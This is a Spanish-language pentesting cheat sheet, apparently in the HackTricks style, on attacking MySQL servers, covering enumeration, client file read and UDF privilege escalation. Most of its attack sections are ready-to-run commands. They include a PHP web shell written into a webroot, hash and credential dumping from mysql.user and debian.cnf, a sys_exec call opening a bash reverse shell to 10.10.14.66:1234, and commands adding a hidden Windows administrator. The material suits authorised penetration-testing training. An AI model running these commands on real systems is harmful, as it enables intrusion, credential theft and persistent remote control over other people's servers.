---
description: Explotando el servicio de Bases de Datos relacionales MySQL.
---

# 3306 - MYSQL

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql" %}

## INFORMACIÓN BÁSICA

MySQL es el sistema de gestión de bases de datos relacional más extendido en la actualidad al estar basada en código abierto.&#x20;

MySQL cuenta con una doble licencia. Por una parte es de código abierto, pero por otra, cuenta con una versión comercial gestionada por la compañía Oracle.

Trabaja con bases de datos relacionales, es decir, utiliza tablas múltiples que se interconectan entre sí para almacenar la información y organizarla correctamente, además, al ser basada en código abierto es fácilmente accesible.

Sus características más importantes son:

* **Arquitectura Cliente y Servidor**
* **Utiliza lenguaje SQL**
* **Vistas ->** En bases de datos grandes, las vistas se convierten en un recurso fundamental. Desde MySQL 5.0 se pueden utilizar vistas personalizadas.
* **Procedimientos almacenados ->** MySQL no procesa las tablas directamente sino que a través de procedimientos almacenados lo que mejora la eficacia.
* **Automatización de tareas**

**fuente (adaptado)**: [https://openwebinars.net/blog/que-es-mysql/](https://openwebinars.net/blog/que-es-mysql/)

## CONECTARSE

### Local

```
mysql -u root # Se conecta a root sin contraseña.
mysql -u root -p # Se pedirá una contraseña para acceder.
```

### Remoto

```
mysql -h <Hostname> -u root -p
mysql -h <Hostname> -u root@localhost
```

También se puede conectar a la Base de Datos incluyendo un documento de texto con los comandos SQL a realizar o marcando los comandos en la misma sintaxis:

```
mysql -u username -p < manycommands.sql # Un archivo con todos los comandos a ejecutar

mysql -u root -h 127.0.0.1 -e 'show databases;'
```

### Bases de Datos / Tablas por defecto

{% tabs %}
{% tab title="information_schema" %}
ALL\_PLUGINS\
APPLICABLE\_ROLES\
CHARACTER\_SETS\
CHECK\_CONSTRAINTS\
COLLATIONS\
COLLATION\_CHARACTER\_SET\_APPLICABILITY\
COLUMNS\
COLUMN\_PRIVILEGES\
ENABLED\_ROLES\
ENGINES\
EVENTS\
FILES\
GLOBAL\_STATUS\
GLOBAL\_VARIABLES\
KEY\_COLUMN\_USAGE\
KEY\_CACHES\
OPTIMIZER\_TRACE\
PARAMETERS\
PARTITIONS\
PLUGINS\
PROCESSLIST\
PROFILING\
REFERENTIAL\_CONSTRAINTS\
ROUTINES\
SCHEMATA\
SCHEMA\_PRIVILEGES\
SESSION\_STATUS\
SESSION\_VARIABLES\
STATISTICS\
SYSTEM\_VARIABLES\
TABLES\
TABLESPACES\
TABLE\_CONSTRAINTS\
TABLE\_PRIVILEGES\
TRIGGERS\
USER\_PRIVILEGES\
VIEWS\
INNODB\_LOCKS\
INNODB\_TRX\
INNODB\_SYS\_DATAFILES\
INNODB\_FT\_CONFIG\
INNODB\_SYS\_VIRTUAL\
INNODB\_CMP\
INNODB\_FT\_BEING\_DELETED\
INNODB\_CMP\_RESET\
INNODB\_CMP\_PER\_INDEX\
INNODB\_CMPMEM\_RESET\
INNODB\_FT\_DELETED\
INNODB\_BUFFER\_PAGE\_LRU\
INNODB\_LOCK\_WAITS\
INNODB\_TEMP\_TABLE\_INFO\
INNODB\_SYS\_INDEXES\
INNODB\_SYS\_TABLES\
INNODB\_SYS\_FIELDS\
INNODB\_CMP\_PER\_INDEX\_RESET\
INNODB\_BUFFER\_PAGE\
INNODB\_FT\_DEFAULT\_STOPWORD\
INNODB\_FT\_INDEX\_TABLE\
INNODB\_FT\_INDEX\_CACHE\
INNODB\_SYS\_TABLESPACES\
INNODB\_METRICS\
INNODB\_SYS\_FOREIGN\_COLS\
INNODB\_CMPMEM\
INNODB\_BUFFER\_POOL\_STATS\
INNODB\_SYS\_COLUMNS\
INNODB\_SYS\_FOREIGN\
INNODB\_SYS\_TABLESTATS\
GEOMETRY\_COLUMNS\
SPATIAL\_REF\_SYS\
CLIENT\_STATISTICS\
INDEX\_STATISTICS\
USER\_STATISTICS\
INNODB\_MUTEXES\
TABLE\_STATISTICS\
INNODB\_TABLESPACES\_ENCRYPTION\
user\_variables\
INNODB\_TABLESPACES\_SCRUBBING\
INNODB\_SYS\_SEMAPHORE\_WAITS
{% endtab %}

{% tab title="Untitled" %}
columns\_priv\
column\_stats\
db\
engine\_cost\
event\
func\
general\_log\
gtid\_executed\
gtid\_slave\_pos\
help\_category\
help\_keyword\
help\_relation\
help\_topic\
host\
index\_stats\
innodb\_index\_stats\
innodb\_table\_stats\
ndb\_binlog\_index\
plugin\
proc\
procs\_priv\
proxies\_priv\
roles\_mapping\
server\_cost\
servers\
slave\_master\_info\
slave\_relay\_log\_info\
slave\_worker\_info\
slow\_log\
tables\_priv\
table\_stats\
time\_zone\
time\_zone\_leap\_second\
time\_zone\_name\
time\_zone\_transition\
time\_zone\_transition\_type\
transaction\_registry\
user
{% endtab %}

{% tab title="performance_schema" %}
accounts\
cond\_instances\
events\_stages\_current\
events\_stages\_history\
events\_stages\_history\_long\
events\_stages\_summary\_by\_account\_by\_event\_name\
events\_stages\_summary\_by\_host\_by\_event\_name\
events\_stages\_summary\_by\_thread\_by\_event\_name\
events\_stages\_summary\_by\_user\_by\_event\_name\
events\_stages\_summary\_global\_by\_event\_name\
events\_statements\_current\
events\_statements\_history\
events\_statements\_history\_long\
events\_statements\_summary\_by\_account\_by\_event\_name\
events\_statements\_summary\_by\_digest\
events\_statements\_summary\_by\_host\_by\_event\_name\
events\_statements\_summary\_by\_program\
events\_statements\_summary\_by\_thread\_by\_event\_name\
events\_statements\_summary\_by\_user\_by\_event\_name\
events\_statements\_summary\_global\_by\_event\_name\
events\_transactions\_current\
events\_transactions\_history\
events\_transactions\_history\_long\
events\_transactions\_summary\_by\_account\_by\_event\_name\
events\_transactions\_summary\_by\_host\_by\_event\_name\
events\_transactions\_summary\_by\_thread\_by\_event\_name\
events\_transactions\_summary\_by\_user\_by\_event\_name\
events\_transactions\_summary\_global\_by\_event\_name\
events\_waits\_current\
events\_waits\_history\
events\_waits\_history\_long\
events\_waits\_summary\_by\_account\_by\_event\_name\
events\_waits\_summary\_by\_host\_by\_event\_name\
events\_waits\_summary\_by\_instance\
events\_waits\_summary\_by\_thread\_by\_event\_name\
events\_waits\_summary\_by\_user\_by\_event\_name\
events\_waits\_summary\_global\_by\_event\_name\
file\_instances\
file\_summary\_by\_event\_name\
file\_summary\_by\_instance\
global\_status\
global\_variables\
host\_cache\
hosts\
memory\_summary\_by\_account\_by\_event\_name\
memory\_summary\_by\_host\_by\_event\_name\
memory\_summary\_by\_thread\_by\_event\_name\
memory\_summary\_by\_user\_by\_event\_name\
memory\_summary\_global\_by\_event\_name\
metadata\_locks\
mutex\_instances\
objects\_summary\_global\_by\_type\
performance\_timers\
prepared\_statements\_instances\
replication\_applier\_configuration\
replication\_applier\_status\
replication\_applier\_status\_by\_coordinator\
replication\_applier\_status\_by\_worker\
replication\_connection\_configuration\
replication\_connection\_status\
replication\_group\_member\_stats\
replication\_group\_members\
rwlock\_instances\
session\_account\_connect\_attrs\
session\_connect\_attrs\
session\_status\
session\_variables\
setup\_actors\
setup\_consumers\
setup\_instruments\
setup\_objects\
setup\_timers\
socket\_instances\
socket\_summary\_by\_event\_name\
socket\_summary\_by\_instance\
status\_by\_account\
status\_by\_host\
status\_by\_thread\
status\_by\_user\
table\_handles\
table\_io\_waits\_summary\_by\_index\_usage\
table\_io\_waits\_summary\_by\_table\
table\_lock\_waits\_summary\_by\_table\
threads\
user\_variables\_by\_thread\
users\
variables\_by\_thread
{% endtab %}

{% tab title="sys" %}
host\_summary\
host\_summary\_by\_file\_io\
host\_summary\_by\_file\_io\_type\
host\_summary\_by\_stages\
host\_summary\_by\_statement\_latency\
host\_summary\_by\_statement\_type\
innodb\_buffer\_stats\_by\_schema\
innodb\_buffer\_stats\_by\_table\
innodb\_lock\_waits\
io\_by\_thread\_by\_latency\
io\_global\_by\_file\_by\_bytes\
io\_global\_by\_file\_by\_latency\
io\_global\_by\_wait\_by\_bytes\
io\_global\_by\_wait\_by\_latency\
latest\_file\_io\
memory\_by\_host\_by\_current\_bytes\
memory\_by\_thread\_by\_current\_bytes\
memory\_by\_user\_by\_current\_bytes\
memory\_global\_by\_current\_bytes\
memory\_global\_total\
metrics\
processlist\
ps\_check\_lost\_instrumentation\
schema\_auto\_increment\_columns\
schema\_index\_statistics\
schema\_object\_overview\
schema\_redundant\_indexes\
schema\_table\_lock\_waits\
schema\_table\_statistics\
schema\_table\_statistics\_with\_buffer\
schema\_tables\_with\_full\_table\_scans\
schema\_unused\_indexes\
session\
session\_ssl\_status\
statement\_analysis\
statements\_with\_errors\_or\_warnings\
statements\_with\_full\_table\_scans\
statements\_with\_runtimes\_in\_95th\_percentile\
statements\_with\_sorting\
statements\_with\_temp\_tables\
sys\_config\
user\_summary\
user\_summary\_by\_file\_io\
user\_summary\_by\_file\_io\_type\
user\_summary\_by\_stages\
user\_summary\_by\_statement\_latency\
user\_summary\_by\_statement\_type\
version\
wait\_classes\_global\_by\_avg\_latency\
wait\_classes\_global\_by\_latency\
waits\_by\_host\_by\_latency\
waits\_by\_user\_by\_latency\
waits\_global\_by\_latency\
x$host\_summary\
x$host\_summary\_by\_file\_io\
x$host\_summary\_by\_file\_io\_type\
x$host\_summary\_by\_stages\
x$host\_summary\_by\_statement\_latency\
x$host\_summary\_by\_statement\_type\
x$innodb\_buffer\_stats\_by\_schema\
x$innodb\_buffer\_stats\_by\_table\
x$innodb\_lock\_waits\
x$io\_by\_thread\_by\_latency\
x$io\_global\_by\_file\_by\_bytes\
x$io\_global\_by\_file\_by\_latency\
x$io\_global\_by\_wait\_by\_bytes\
x$io\_global\_by\_wait\_by\_latency\
x$latest\_file\_io\
x$memory\_by\_host\_by\_current\_bytes\
x$memory\_by\_thread\_by\_current\_bytes\
x$memory\_by\_user\_by\_current\_bytes\
x$memory\_global\_by\_current\_bytes\
x$memory\_global\_total\
x$processlist\
x$ps\_digest\_95th\_percentile\_by\_avg\_us\
x$ps\_digest\_avg\_latency\_distribution\
x$ps\_schema\_table\_statistics\_io\
x$schema\_flattened\_keys\
x$schema\_index\_statistics\
x$schema\_table\_lock\_waits\
x$schema\_table\_statistics\
x$schema\_table\_statistics\_with\_buffer\
x$schema\_tables\_with\_full\_table\_scans\
x$session\
x$statement\_analysis\
x$statements\_with\_errors\_or\_warnings\
x$statements\_with\_full\_table\_scans\
x$statements\_with\_runtimes\_in\_95th\_percentile\
x$statements\_with\_sorting\
x$statements\_with\_temp\_tables\
x$user\_summary\
x$user\_summary\_by\_file\_io\
x$user\_summary\_by\_file\_io\_type\
x$user\_summary\_by\_stages\
x$user\_summary\_by\_statement\_latency\
x$user\_summary\_by\_statement\_type\
x$wait\_classes\_global\_by\_avg\_latency\
x$wait\_classes\_global\_by\_latency\
x$waits\_by\_host\_by\_latency\
x$waits\_by\_user\_by\_latency\
x$waits\_global\_by\_latency
{% endtab %}
{% endtabs %}

## ENUMERACIÓN

### Externa

Utilizando nmap o msf:

```bash
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>
msf> use auxiliary/scanner/mysql/mysql_version
msf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf> use auxiliary/scanner/mysql/mysql_hashdump #Creds
msf> use auxiliary/admin/mysql/mysql_enum #Creds
msf> use auxiliary/scanner/mysql/mysql_schemadump #Creds 
msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds
```

### [Fuerza Bruta](../techniques/fuerza-bruta/cheatsheet.md#mysql)

## COMANDOS SQL

```sql
show databases;
use <database>;
show tables;
describe <table_name>;
show columns from <table>;

select grantee, table_schema, privilege_type FROM schema_privileges; #Exact privileges
select user,file_priv from mysql.user where user='root'; #File privileges
select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name

#Conseguir una shell con el usuario de MySQL
\! sh

#Basic MySQLi
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"

#Read & Write
## Yo need FILE privilege to read & write to files.
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'

#Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
```

## EXPLOTACIÓN

### Lectura arbitraria de archivos por cliente

Cuando intentas cargar archivos locales en una tabla, el servidor de MySQL o MariaDB hace que el contenido del archivo sea leido por el cliente y después enviado.

Por ese motivo, si eres capaz de iniciar un cliente MySQL y conectarlo a tu propio servidor MySQL, podrías leer archivos arbitrarios.

<pre class="language-sql"><code class="lang-sql"><strong>mysql -u &#x3C;USER> -p --enable-local-infile
</strong><strong>
</strong><strong>load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
</strong></code></pre>

Es importante utilizar el modificador local, ya que sino podemos obtener el siguiente error:

```sql
mysql> load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';

ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv 
option so it cannot execute this statement
```

{% hint style="info" %}
Para hacerlo correctamente necesitas un servidor MySQL. Se puede utilizar el siguiente:\
[https://github.com/allyshka/Rogue-MySql-Server](https://github.com/allyshka/Rogue-MySql-Server)\
\
Además pueden encontrar el resumen de la vulnerabilidad [**aquí**](http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/).

La explicación detallada de la vulnerabilidad [**aquí**](https://paper.seebug.org/1113/).
{% endhint %}

## POST-EXPLOTACIÓN

### Comprobar el usuario de MySQL

Es muy interesante comprobar, después del acceso inicial a un objetivo, si el usuario root es el que maneja MySQL por que se puede utilizar para escalar privilegios.

```bash
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | grep "user"
systemctl status mysql 2>/dev/null | grep -o ".\{0,0\}user.\{0,50\}" | cut -d '=' -f2 | cut -d ' ' -f1
```

### Configuraciones Peligrosas

El archivo de configuración por defecto es:

```
mysqld.cnf
```

|    CONFIGURACIÓN   | DESCRIPCIÓN                                                                                                                                                            |
| :----------------: | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|        user        | marca qué usuario ejecuta el servicio MySQL                                                                                                                            |
|      password      | marca la contraseña para dicho usuario                                                                                                                                 |
|   admin\_address   | marca la IP en la que mantenerse a la escucha para conexiones TCP/IP en la interfaz de administración                                                                  |
|        debug       | Esta variable indica los ajustes de debug.                                                                                                                             |
|    sql\_warnings   | Esta variable controla si las consultas INSERT de una sola linea generan un aviso en caso necesario (Puede implicar la existencia de información crítica en los Logs). |
| secure\_file\_priv | Esta variable controla los privilegios en las acciones de importación y exportación.                                                                                   |

## Escalada de privilegios

### Cheatsheet

```
# Conseguir los privilegios y los hashes de todos los usuarios. 
use mysql;
select user();
select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user;

# One-liner para conseguir los credenciales.
mysql -u root --password=<PASSWORD> -e "SELECT * FROM mysql.user;"

# Crear un usuario y darle privilegios (dependiendo de los privilegios que tengamos nosotros).
create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;

# Conseguir una shell. Muy util para sudo/suid privesc)
\! sh
```

### Escalada de Privilegios vía Librería UDF

Si el servidor MySQL está corriendo como root (u otro usuario con más privilegios que tú) puedes hacer que ejecute **comandos**. Para ello necesitas funciones definidas por el usuario o **User Defined Functions**. Y para crear una de esas funciones necesitas una librería para el Sistema Operativo que está corriendo MySQL.

La librería maliciosa se encuentra dentro de `sqlmap` o `metasploit`. Podemos utilizar el comando `locate "*lib_mysqludf_sys*"` para encontrarla. El archivo **`.so`** es la librería de Linux y el archivo **`.dll`** es la versión de Windows.

Si no tiene las librerías, puede buscarlas o descargarlas de [**aquí** ](https://www.exploit-db.com/exploits/1518)y compilarlas en la máquina LINUX vulnerable (no está para Windows)

```bash
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Ahora que ya tenemos ubicada nuestra librería, nos conectamos al servidor MySQL como root y realizamos los siguiente:

#### Linux

```sql
# Use a database
use mysql;
# Create a table to load the library and move it to the plugins dir
create table npn(line blob);
# Load the binary library inside the table
## You might need to change the path and file name
insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));
# Get the plugin_dir path
show variables like '%plugin%';
# Supposing the plugin dir was /usr/lib/x86_64-linux-gnu/mariadb19/plugin/
# dump in there the library
select * from npn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so';
# Create a function to execute commands
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
# Execute commands
select sys_exec('id > /tmp/out.txt; chmod 777 /tmp/out.txt');
select sys_exec('bash -c "bash -i >& /dev/tcp/10.10.14.66/1234 0>&1"');
```

#### Windows

```sql
# CHech the linux comments for more indications
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn values(load_files('C://temp//lib_mysqludf_sys.dll'));
show variables like '%plugin%';
SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
SELECT sys_exec("net user npn npn12345678 /add");
SELECT sys_exec("net localgroup Administrators npn /add");
```

### Extraer credenciales de MySQL de otros archivos

#### /etc/mysql/debian.cnf

Dentro del mismo podemos encontrar credenciales en texto claro del usuario **`debian-sys-maint`** y estos credenciales se pueden utilizar para loguearse en MySQL.

#### _/var/lib/mysql/mysql/user.MYD_

Se pueden encontrar todos los hashes que se pueden extraer de mysql.user.

```bash
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | 
grep -v "mysql_native_password"
```

### Activar los logs

Se pueden activar los logs de MySQL en el archivo `/etc/mysql/my.cnf` descomentando las siguientes lineas:

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

### Archivos útiles



* **Archivos de configuración**
  * **WINDOWS** \*
    * config.ini
    * my.ini
      * windows\my.ini
      * winnt\my.ini
    * \<InstDir>/mysql/data
  * **UNIX**
    * my.cnf
      * /etc/my.cnf
      * /etc/mysql/my.cnf
      * /var/lib/mysql/my.cnf
      * \~/.my.cnf
      * /etc/my.cnf
* **Command History**
  * \~/.mysql.history
* **Log Files**
  * connections.log
  * update.log
  * common.log
